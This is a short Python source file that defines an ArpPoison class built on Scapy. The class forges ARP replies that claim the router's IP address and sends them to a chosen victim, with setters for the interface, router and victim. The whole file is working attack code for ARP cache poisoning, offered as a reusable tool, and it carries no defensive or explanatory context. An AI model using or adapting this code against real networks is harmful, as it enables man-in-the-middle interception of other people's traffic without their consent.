import time
import threading
from scapy.layers.l2 import *
from scapy.route import *

class ArpPoison():
    """docstring for ArpPoison"""
    def __init__(self, iface=None, router=None,victim=None,verbose=0):
        """
        Keyword arguments:
        iface -- the network interface
        router -- ip address of router, ip address you want to do 'spoofing'
        victim -- ip address of victim
        verbose -- set verbose mode of arping (default 0)
        """
        self.iface = iface
        self.router = router
        self.victim = victim
        self.verbose = verbose
        #configure scapy's variable for sending packets
        conf.iface= self.iface
        #create fake ARP packet
        self.pkt = ARP()
        self.pkt.psrc = self.router
        self.pkt.pdst = self.victim

    def attack(self):
        """Start to send poisoned packets to the victim"""
        send(self.pkt,verbose = self.verbose)

    def setIFace(self, iface):
        self.iface = iface
        conf.iface= self.iface
    
    def setRouter(self, router):
        self.router = router
        self.pkt.psrc = self.router
        
    def setVictim(self, victim):
        self.victim = victim
        self.pkt.pdst = self.victim
        
